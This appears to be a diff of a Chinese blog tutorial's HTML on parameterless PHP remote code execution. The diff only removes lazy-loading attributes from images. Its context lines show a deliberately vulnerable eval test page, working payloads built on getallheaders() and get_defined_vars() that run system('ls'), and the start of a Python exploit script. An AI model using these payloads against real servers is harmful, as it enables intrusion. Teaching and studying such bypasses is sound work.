@@ -48,7 +48,7 @@
 <p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p>
 <p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p>
 <p><strong>目录下文件</strong>：</p>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt=""></p>
 <h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
 <span class="token delimiter">&lt;?php</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    
@@ -62,14 +62,14 @@
 <ul>
 <li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li>
 </ul>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt=""></p>
 <h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>RCE</p>
 <ul>
 <li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li>
 <li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li>
 </ul>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt=""></p>
 <h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class=" language-php"><code class="language-php"><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p>利用全局变量进RCE</p>
 <ul>
@@ -77,7 +77,7 @@
 <li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li>
 <li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li>
 </ul>
-<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt="" loading="lazy"></p>
+<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt=""></p>
 <p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
